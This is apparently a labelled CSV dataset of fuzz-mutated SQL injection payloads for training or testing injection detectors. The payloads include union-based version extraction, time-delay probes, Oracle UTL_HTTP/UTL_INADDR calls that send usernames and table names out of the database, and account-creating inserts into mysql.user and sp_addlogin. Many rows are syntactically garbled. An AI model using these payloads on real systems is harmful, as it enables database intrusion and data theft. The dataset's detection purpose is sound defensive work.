payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
OR/*U:*/'uNuSuAL' :!= `<'unusUaL',unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sElEcT * FRoM uSErs whErE ID=0o1+ oR 0x5|uNIOn+SELECt 3O6X0X1,BaNNER frOm{v$VeRSiON=WHeRE roWnUm =_/*|ib^E*/0X0 And ""y"" NOt lIke ""Y@""; OR "" Z"" NOt Like "";z""<AND tRue oR!""Gp""/**/LIkE or 2614=2615 OR False#""GpE"" -- (SELECT.(sELeCt (SeLEct (SELECT 3))))| X~!O",union_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.41,rule,sqliv5_json,string_double_quote
"/**/sELecT * froM uSErs WHeRE id LIKE 2x1 <@$$ unIon SeLECt (seLeCt (SELECT 0)),verSiOn (` ) oR fALsE && 'F' NOT LIKE 'Fe' --=3!\w",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_single_quote
"0b0O6 /**/) or BEncHMARK ( /*(SeLeCT oR faLSE and '=g'<>'=Gh' or ""B)^F"" NOt lIKE ""B)^f"" OR False AND True#(selecT 0x7)) */(sEleCt (SELecT (SeLECt (seLecT (SELECT (SELECT (SELECT (SELECT 10306003)))))))),mD0x0X5 ( ""1 ) /*me$k+b""*/ ) _`oR (SeLEct (SeleCT 0o0x5)) && TrUe && ""HY"" NoT LikE ""Hy%""#G<O",time_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative,0.45,rule,sqliv5_json,string_double_quote
"selecT * FRoM}usERs?wHErE/Id lIkE 0x1/*$Ux~}HR 9oPYOjBu3Z+GvWI1eLDhl?g~n7T*/%$]6X0B0O0X8o0o0X0O1 {oR] 3X1`:=/*Y$Ovl$ u*/^0X1 ] && ]0X6""}OR)<FAlse:--(1lg /G",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SELeCT *)FROM useRs WhERE?id = 0x0X7 %!<@ Or}0X0O5B0o0B1000 LIkE 0x7 OR/*|;v*/(seLecT 0xC3c) nOt lIKe&0x0X17fE Or '&.p' noT liKe '&.p'?oR (selECt{0x0x0) or) ""X"" nOT likE ""x"" ANd 'dtz' nOT liKE 'DTZr' ANd "")""!="")0b0x64"" Or (selecT 0o0O11007) not LikE (selECt (sElECT (selECT (selEcT (SELECT 1615))))) Or^(SElect (SelEcT (SeLEct (SELECT (SELECT 2021))))) noT like (SELECT 8x979) Or ""["" NOt LiKe ""["" oR 0X0xd5F NoT lIke (SELECT 8510)[-- (seleCT (SELEct 0)) c<2x9",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
1 _)*| or sLEEP%[( __tiME__*()/**/ Or_0B0B1011101001000100001100010111010001100 <> 0xc48 aND 1#p 2R,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SelECt * fROM UsERs wHerE id = /*]).*/(SeLECT;0o3x0x7) OR ""0b0x1_"" or (SELECT (SELECT (SELECT (SELECT 1)))) =' (sElECt=0o0x1X3) oR FaLSE aNd 'oO'?NOT LIKE 'ooB' AND True -- 7x7L",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
"SElEcT * FRoM uSerS WHERE Id = (SeLECT (SELEct 1)) <0X7 ;and ""tRuE_Or (seLEcT 0) And |TRue AND TRUE or 0xd32 nOT LIke 0xEC2 OR/*='ii}*/FalSe## uNIoN SElECT 0o0b4,vERsIOn- ( ) -- (selecT (seLECt (SELECT 1)))}>b",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
* OR /*;S0b0o3psI~*Gj{p*/@tRue--,unknown,unknown,inline_comment,0.0,rule,sqliv5_json,unknown
aDMiN'/*U(fV1*/~[AND=[0b1010010015101|NOT LIKE'5287 AND 1#;u,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,numeric
"""[;)_ ;wAItF/*,}S5z]?uS*/OR?\DElAY_'0b110:(SELECT (SELECT 6)):__tImE__'--",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"iNsErT IntO mYsQl.usEr /*vmKx^e*/ ( useR, hoST, paSsw:or d ) vALUES ( ;'NaMe', 'lOcalHosT', pAssWOrD (/*$kok!p*/ 'pASs3X0b0B10b0B11111011100e'; <)_#like )",second_order,unknown,comment_whitespace|inline_comment,0.8,rule,sqliv5_json,insert
"seLeCt *;frOm)uSErs wheRE/iD/*)*/ = (sEleCt (SELECT 1)) Or \<2X1]UNioN SElECT`(seleCT 0o3),@@VeRSIOn Or`faLse OR ""L""!=""L"" oR,FalsE oR 0 OR False -->7",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,numeric
")^ `)/*C^o*/? OR :PG_sLEEP% ( ""__TImE__ &) Or^(sELEcT 0x0X0b0B0b100110100001110100101010F)!=0b0B0b0B1110101101100100111001000101100011010111 OR ""$""=""$/"" AnD trUE OR ""h""<>""H"" AND 1975=(SELECt_1675) and 4858=4850 --",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_double_quote
"SeLect:* FrOm}users!WhERE+ID, likE (SElEct 0x1) oR $+<\ OR\6o5x0x4O4:/*&c/A/XSux""xgJL]M*/like :0x1 or FalSe -- 1V\2vH",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"seleCt * FrOM USErs WHEre iD' = 0x9 OR ( ^$+ () lIKe (SelECT 0o0B2O1) or 8_ liKe (SElect (SElECT 0x8)) ||%0X1eF4 nOt LiKe (sELEct (SeleCt 6994)) aND ` tRue || (selEct (SElect (seLECt (sElecT 0XA2))))<>9x5fA ||<""(>*I""<>""(>*I"" and'(seleCt](seLeCt 0XE67))<>0XE3B Or/*Vf*/""!Cp"" lIke ""!CPk"" Or falSe oR 0o0o0 Or 0xD24&LIkE 0Xd25 Or (SEleCt (SeLECt 0x0)) or/*B](SELECT 1)*/FALsE --^0x0o0X0b11a Y) }]H;AH",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,unknown
"SELECT * FRom usErS WHErE iD =/*;&?OB GB=GeZ*/0x9 or \+<$)unioN seLect (SeLecT (SELECT (SELECT 1))),@@VERsIoN \ OR FALse!AND True -- 0o0B1b0o161",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"sELEcT * FROM USERS whERE/*6G8 Q[PE*/Id` lIke (sEleCt 0B6)- Or \<$ Or""(SelEct (SELECT 1))=(SelEct 0X9) oR FAlsE OR False -- 0x0x0O1[#LrV? 6",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"seLECT * fROM""uSErs WHeRE id = (SELECT (SELECT 1)).~ aND 6 uNIon SelEcT (SELECT 3),VersIon ( ? ) /*5)$\+i*/ AND True AND;3 OR False --(1",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,numeric
a'-WAItF ;/*^t]=W; <>Wvsx3;*/or { DeLay/'0:0b0B0b1111110011x8x0:11'--,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"SeleCt * froM&USeRs WHeRE Id /**/= 0o3 + &( \ ) Union SeLect nULL,@@VErSiON oR (SELECT (SELECT (SELECT (SELECT 4)))) OR False OR False -- 0x1| H",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
Hi' @) _Or/**/+/*[9b0b10001111000011100111001100110r y:fP$ &fe*/( +'a' (lIkE/**/;'A,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sElecT * froM uSerS whEre ID/*.[(t*/ OR False OR False AND True#= 0x1 or ""{."" OR (SELECT 0x9) = 0o1 and ""d]W"" nOt LiKE ""D]wE"" or:(SELECT (SELECT 0))!oR (SELECT 1)`OR (SELECT (SELECT 3x25d8)) != 0x35d8(AND True -- 7D",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,string_double_quote
"""!}) ` :or ;SleEP ;( !__tIME__~@) /**/< =@{""",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
sElEct *?fRom USers/*J%(SELECT`(SELECT 0x0))=*/wHere Id{= 0b0o5.<@.' OR ;0o0o0X0.= 0x0o1 --)5g{ GoPm,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"AdMin"" )| or[ ( ""2B0o6o9B113"" -=^`Or:`faLse OR FAlSEAnD(SELeCt 0O0O1) or+ fALSE aNd'truE AND 0x1?or FALse && TRUe#/*E A*/""0B7o8""--`(SELECT 0)?X",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
sElecT * fROM uSERs/*buI*/wHERE Id = (SElEct 0x1) + \+%1 or 0b0o1 = $(SELECT (SELECT 6)) oR FaLse or fAlse -- 1ab,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SELEct * fRoM/*sg*/useRS WhERe ID =/*]*/(SeLEct (selEcT (SELeCt 7))) or ""%&"" Or 0o6] = 0x6 oR FALSe or (seleCT (selECT 0X1C2A)) NOT LIKE 0x1c2A Or ""6"" LikE ""6+""<--)8",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
1/*(!l&VA@R/&di*/aND;2x0B101X1 =*0B8X1,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"oR (sELeCt (SeLEct 0B0O156x0)) ]=`;2b0x0x5 OR ""{X""!=""{x"" And true/**/AnD TruE aNd;(SELecT (SELECT 5123)) != 5124 ANd TRue#;7j",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"UNIon?selEcT/*]U`z*/*>fROM useRS_wheRE@logiN ANd<;'egg']noT LIKe`'eGG \ OR falSe#'#== ^""CHaR ...n~ng1",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"=SelEct * fRom useRS{WHeRE id=7x0b0 unIoN/**/SeLECT (sElEct (SELEct (seLeCt (SELECT 7)))) ||+@,vErSIon ( )^< +Or 0x1a2e=(selEcT 0X0X0o1a7B)| oR 'OU' LIKe /*{Z?f`*/'Ou%' Or (SELEcT (seLeCT 0x15FC)) nOt LIKe\(seLeCt 0x17fc) OR FALSE -- 0X1<d\\ZPAs<%",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
adMin'~ ) /*[)~nf)Oghr.D;(sELEcT&(SeleCT}1)){ H*/ or <'0O0b0b1O0B0b1000010001110100000111001001000O1' %liKe^('9o4'--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
oR ''\[/*JG0o0b0o0b111o9J^/z]f_ 2r*/likE[+:',unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"&& `*(selecT (seleCT 0O2o7X0o7O5b0o5o0b0b9o0o0b0b0B1011101910002X0b0B10b0o2)){`liKe utl_iNaDdr.GEt_HoST_ADdRess `/*Q/""C>EIW*/(` (-""?seLeCT.SYs.lOGIn_USEr+fRom DUal- +) )< aND 'I'='I",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.11,rule,sqliv5_json,unknown
"aNd : (SeLecT (sElecT (SeleCT 2))) LIke uTl_iNADDR.geT_Host_aDdrEsS ( ( SelecT dIsTINcT ( ""uSERNAMe{ ) froM ( sELect DIsTinct (@ usERnamE |) , rOwNum As lImiT FroM sys.All_uSeRS )< wHERe liMIT LIKe ^(sElecT (SeleCt 0O4)) ) ) ; aNd 'i'/*s|dH{*/= 'i",error_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
"SeleCT * fROM UsErS{whEre;iD LIkE< 0x0/*Ot O*/oR \< =0b0b0X3 UNiON`SELEcT (selecT (selECT (SELECT (SELECT 4x1)))),@@verSIon OR False -- 0x0b1Dxb6",union_based,mssql,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
"SeleCt * FrOm usERs WHEre Id =< 0x0B100O7 UNIOn sELecT (seLECT (seLECT (sELecT?(seLECt 1))))<@$,vERSiOn ( )! And TRUe And ' '=' ' anD 'W' NOT{liKe 'Wi'/**/aNd (sEleCt (SeLecT (SELECT 5153))) nOT lIke (select 6158) AND tRuE AnD 1 or 0 AnD 'Cw' noT lIkE 'cwk' --/**/1Fe",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.7,rule,sqliv5_json,string_single_quote
"'SelEct~* FrOm(UsErS whEre/* 0b111R*/id!~LIkE ]0o8b5B7O0b0O49140734o1<*\ UNION:seLECT nUll,@@vERsIon && <TRuE Or'FAlSE -- 1bK9Z",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
",select *}FroM usErS wheRe-Id like/*)rN*/ '0o1'[Or !<@ UniON,SELEct;(seLect~0o0O7X0O1),VersIoN (~ )\ OR;'Hg '='Hg R'& OR; false AND?tRUe Or AND (SELECT 1)#faLsE AND (seLeCt (SElEcT (SELECT 1))) -- 0O0'PQF tBE=",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,unknown
"SElecT * FrOM&USeRs/**/wHerE iD LiKe. 4x3 oR "".%""& || (sELecT (Select 1)) LIKe (SeLEcT (SeLECT (selecT 8)))""--(4X1",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
"sELEct * frOm userS WHERe ID=(SelEct 1) oR{"" (% ANd ""d "" NOt LIke ""d K""'OR (SelECt (SelEct (SELECT 0)))#"" or ~0o5 LiKe;/*@A#<Kh.(seLECt 5)/D*/ 6 -- 0b0X1?.&U!",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_single_quote
` OR~ /*AV>rJbi[WI*/ UTl_hTTP.rEqUeST,unknown,oracle,comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"&& 0B0B0O0b10011101X4 likE>UTl_INaDdR.geT_Host_addreSs~ (!{{ ( &seLect DIstINCt +( TAble_NAME' ) from ( seLEct^DISTInCT ( TabLe_nAMe, )!<, RoWnUM as LiMiT fRom sYs.All_tAbLes ]) 'wHERE LiMit LiKE ~(sEleCt 0X0X8X1O0B0b1011101111010) ) ~ ) /*]b)<0X0b10uA?{OkA$gGqC%m_*/ anD 'i'='i",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"SELeCt/*|{bSl%9$*/* frOm useRS Where|ID* likE '3o6'<@.. UnIon SeLECt;0x0b0O0o0O0X9O0x2,veRSIOn ( )' Or "";"" nOT LikE "";"" OR ""}"" LikE ""};"" && (sEleCt (sElecT (sELeCt (SeLECt 8250))))!=4X0XCbB && "":"" NOt like "":t"", OR """"""$nOt lIke """""" And (SelEct 1) or faLse aND 1 And TrUE OR fALSe and (sELecT (SELECT (SELECT 0x139a)))<>5019 anD TRue :&& ""ey""!=""eyS"" OR<False -- 0o0B0o4O1'&#A4RL?A-&i)}(",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
""" ) %^ ) OR^BeNchmArK-[( (sEleCT 0x7X9D2a60),md5 (/**/ 4b2B9 : ) ) . or (SEleCt (select (sEleCt 3X9))) And (SeLecT 1x1) Or FALSE OR FaLsE or FaLse aND (sELecT (SelECt 1))#ZC",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SELEct `* froM users WheRe)iD liKE 0B0O3x4 <@.$ unION seleCt (seLECt (SELECt 1)),vERsIon /**/( ) && true oR ""P""=""PS"" Or ""^""/nOT like ""^"" oR faLse ANd $True or FALSE -- 11",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,unknown
"selecT * FROM uSeRs WheRe Id* liKe 0x0O7 or $ . LIKE (SeLEcT (SelEct 0O4X7)) unIon]SELecT (sEleCT 1X0O1),@@VersiOn/*}P Rja8c{*/--?8J K",union_based,mssql,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,unknown
0b111x6 UnI/*Fk**/ON}sElECT@ALL FROM<WHeRE,unknown,unknown,case_variation|inline_comment,0.0,rule,sqliv5_json,unknown
"seLECT *;frOM uSErs$WhERE""ID<=<0B0XaX5 |oR 7x0x5 or ""4"" Not lIKe<""4"" oR (sElECT (sELECT 0x0)) or fALSE AND True#""? UniON SeleCT`NULL,VeRSiOn/*:y9:r*C&RW*/;( ? ) -- 0b10B0b0o0b1305X0o1""`d+",union_based,nosql,case_variation|inline_comment,0.53,rule,sqliv5_json,unknown
AdMIN'@ ) ` OR /* (sELEcT (SElECt (sELEct 0o2)))@(sELeCt 0X8)<&(SeLEct 0O11)*/'1' = '8X3X4'_oR (seLECT 0x0) AND+TRUE AND True OR False#zcb,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"; OR ,Utl_http.REQueSt [(~]'hTTp://(SElecT (seleCt 0b0x2a)).3X0o0B93101C.(SELect (sELeCt>(SELECT 7))).(seleCT 0x1)/'{ );/*(aQGcR0*/\ *or :''",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"selEct * froM usErs whErE Id {= (sELEct 1) Or ""{@"" OR (SELECT 1) \=` (sElECT 1) And/*;_Xb""*/ (SELECT 1) oR 0 && true OR 1 or FaLSE OR fALsE -- 0x1",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
or/*_JVgj9x0o72s\Ilkp.~*/TrUe--,unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SelECt * fROm.UsErs.wHeRE ID (= $'4B7b0X0O7o0B1' unIoN SeLeCT&\>; OR (SELECT 0X0) And (seLECT (sELEcT 1));OR''P' liKe 'P""' Or FaLSe OR`FAlsE OR/*<).ts!}uv */fALsE or FAlsE aND tRue(AND True OR False#,@@VerSION(--,0b11x8'I4T",union_based,mssql,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
""" _ /*<;2O0X0O6o0B0<knMMi*/ or/ ]-!true--",unknown,unknown,comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sElEct_* fROM&USeRS]WHeRE'Id =;0b0x1. OR)7b0x4O1 [Like 8B0X9$ aNd )0X0o15156?NoT, liKE} (sELeCT 9x5332)_oR faLSE --/*pGg/*!H<*/E""*(y}*/3",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SElEcT * fROm Users""whErE ID = 0x4 or$@` Or 0B151000118001!=(SelECT (sElEct (seleCT (sELEcT 0Xa3D)))) or 'za,R'<>'Za,R' OR fALsE Or "";""<<> "";"" OR fALsE && ""P"";Not lIKe'""Pu"" && tRue#"", = 0x0x7 UNion SELEcT (SElECT 0O0X1),VErsIOn/*BD(s]]8ieQ3*/ ( ) -- 1pi =r",union_based,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"seLeCt *_froM uSeRS WHeRE ID (= (sELEcT (SELECT (SELECT 0x1))) oR "";@"" OR (sElEct (SELECT 1)) =, 0b0x0b101 [And /**/""H""<>""hz"" OR ""b@ ""!=""b@ "" OR False AND True -- 01",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_double_quote
Â OR (sElect/0B11) %= 1? Or =0B0b10010001100001010101000000010011111101011001 lIKE/**/0x0X2192/--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
: anD 0b111b0o0o0b110010x0X0o10X2; likE [utl_iNADdr.GeT_HOsT_ADDrESS<) (/*v9Y S*/ (/**/ selEct gloBal_NamE fRom GloBal_nAme? )~&~))/*afO)y}G)~*/ ? && 'I'='I,unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
"SelEcT * FroM USerS WheRE iD LIKE (sELEcT 0o1) +2X0o4 uNION selECT/*LL}*/nULl,bANnER frOM v$VErsiON WherE ROwNum liKe 5o1 oR fAlse!Or FALSE or ' '<>' ' OR False OR False -- 1",union_based,oracle,case_variation|comment_whitespace|inline_comment,0.46,rule,sqliv5_json,string_single_quote
"selECt *;fROM/UsErS WHERe Id!'= (sElEcT (SelECT 4)) ""Or "" )+!3b1""_ OR/*HQ;|&ddHv7*/ (SeLECt (seLECt 7)) Like 3x8 Or ""gt""=""GT>"" or 0b5O0x0 aNd tRUeAnD(SELeCT (seLeCT 1))/aNd]TRUe OR 0x0x0 or (sElECt (SELECT 0)) or ""gfw""!=""gfw"" OR 0 -- 0o0B4B0b9x1b 9""d",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_double_quote
"seLeCt * fRom useRs wHere id] =/*0o5pYNj*/ '6' UNIoN SELeCt !<0,VErsiOn ( ; ) ANd trUe or (SELEcT 0) AND ""Yw"" NOT LIKE ""Ywi"" AND True OR False OR False -- 0o1'n,<G22g(e",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.8,rule,sqliv5_json,string_double_quote
"SElect-* FROm UsERS whEre id LIKE |0o8 OR ""{ ""(` ""=5X4B2 or (seLeCt (selEcT 0X0b101)) }= $(seleCt$(SeLECt 3x0b100)) Or <FaLSE or ""O"" not lIKE;""o"" AND ""8""=""0O0"" or false?ANd/**/trUe;oR'']' nOt likE'']' OR FALsE OR FalSe OR False --/*q(S!>&*/1Q",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,string_single_quote
"sELeCt * FrOM uSeRs wHEre@id $lIKE 0x0O0o1 += ( \. ) Or (seLect (SeleCT[(selECT 0x1))) liKe 0O0x1b1 Or "" "" NOt LiKE "" "" OR fALsE or ""j6B"" ~LIkE ""j6b>"" oR fALSE/**/and TRUe && (sEleCt (selEct (SeLect 1))) oR FalSe`ANd True -- 3O0b10600A=V|",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative,0.0,rule,sqliv5_json,string_double_quote
"sELEcT * froM{usERS""wHERE|Id LIkE (seLEcT 9O0b0O1) &@~Or 1B1? likE , (SElect,9X1) AnD ""4""/*<Hc?*/Not;liKE{""5J""]--)0x0b0b1+""",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"{ANd 9X0B0X6O8X5o3X1=uTl_iNADdR.GeT_HOSt_ADDrESS :({ ( sElECt DIstiNct ( coLUmN_nAME$ ), froM (>,SELEcT distINcT ( cOlumN_naMe )! , ROwnum/*""|&gL;ciH@Qo.6*/AS Limit]From alL_TaB_ColumNs <) .^WhErE lImit ==(sELEcT (SElECt aNd (SelECt (SELECt/(SELECT (SELECT (SELECT 1))))) !||= FaLse Or 0x0 OR False OR False#0o29)) + ) !) anD 'i'='i1_",unknown,oracle,case_variation|comment_whitespace|inline_comment,0.06,rule,sqliv5_json,unknown
""" /*>A (seLECt,(SELECT?0o10x4))*/or``""""*""",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"SElect)* FrOM]usERS WHeRE%id lIKe '3o2' oR 0O9X0b1^% LIkE 0b0x0 UnIOn sELect^(sElECt 5),bAnnEr`FROM V$VERsION wHerE roWnUM lIke (sELeCT 6) or FAlSe Or 6X0/*GM,gC*/ or FaLSe AND 0x745!=0x776`oR faLSE oR falSe||False OR fAlsE AND True OR False -- 0b0x3'}$>c1cTJA",union_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative,0.46,rule,sqliv5_json,unknown
SElECT_*{fRom;Inf or/*&G(a ;0X0X0o0O9X9M'0x5*/MAtIoN_SChEma.taBles--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"~Select_*`from uSErs wheRE?Id/*g& T*/ !lIke. ""'3x9B2''uNion SEleCT $ .,@@vErsIon oR 'nvp|'='nVP|,'` oR ; FAlSE &&_7x1 `And* TRuEANdtruE;--@1o2'g~(SELEcT~(SELeCt/*]*(SelEcT 8)[K]$i*/0x3)),j0x0B102?0I:&g",union_based,mssql,case_variation|comment_whitespace|inline_comment|hex_string,0.41,rule,sqliv5_json,unknown
"eXeC Sp_ADDlOGin/'NAME'/*<,F2x4X4F\sh&@@`AC~0b6O16wB(C?li>is:z1Ohr)hMJ[ (SElEct 2)*/,)'PASsWorD'",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sElEct * from USeRS wHErE id LiKE 0x0b12 Union""SElECt Null,BANnEr fRoM v$veRSioN WHERE roWnum'=~5x1/**/or fALSE && trUe{-- (SelECt (SELECT 4))@WAH$P",union_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,unknown
0x77616974066F722064656C61792027303A0x12fA0b1110111011010010000101100 EXEC (?{@S/**/ ),unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"seleCT * FroM UseRS*WHeRE iD/*)HW!E*/ = (SELEct 0x8) or-"". ) "" or 0x0O0O1 LikE (SelecT+(SELECT (SELECT 1))) or FALsE Or FAlSe -- 0X0\",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"%Select *\from USERs WhEre ID = 0x0b110 OR/* ANd\(SELECt 2x1) [ aND True anD ""S""!=""s0o0b0X0B10"" AND ? truE [OR fAlSe;aND "",="" NoT LIke "",=&"" OR False OR False OR False#""a-h! ^myaKz?me/go_5 >m> G'TTy*/@<@ =.(SelEct 3O0) uniOn SeLect{6x1,verSIoN (*=\&)`/ And?"":@""<>"" @D"" --!(sELeCt (sELECt 0x1)) :Ub7>'V",union_based,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.8,rule,sqliv5_json,string_double_quote
groUp By UseRiD(haViNg;1 /**/= (sEleCT (SELECT 1))--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
"sELEct * fRom]USErS whErE Id = 1X1 *(seLEcT (SELECT (SELECT (SELECT 1))))/*Xb*/ || *5x0x9 liKE \(sELECt (SELECT 8)) oR 'X'='xo' OR ""`""!=""`"" && ""S""!=""S?"" OR{False AND True/**/-- (selecT 0b105)+:$v,U",boolean_blind,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,string_single_quote
"SElECT * frOm usErS WHerE iD = (selEct (sELect 1)) Or @ And ""6"" NoT lIKe/""4"""" anD (sElecT 1) AND (SELECt (seleCT (sElEcT (SEleCT 5))))/**/anD TRUE aNd trUE aND 1#""; }LIkE (selEcT 0b0o1) or 4B1 = 5 --&09""ek9[ lOa{\",unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
‘ oR 3B111X8B3/**/ like (sElEct 0o0x1)&or (seLEct (sEleCT (SElECT 0))) or fAlsE`--,unknown,unknown,case_variation|comment_whitespace|inline_comment,0.0,rule,sqliv5_json,unknown
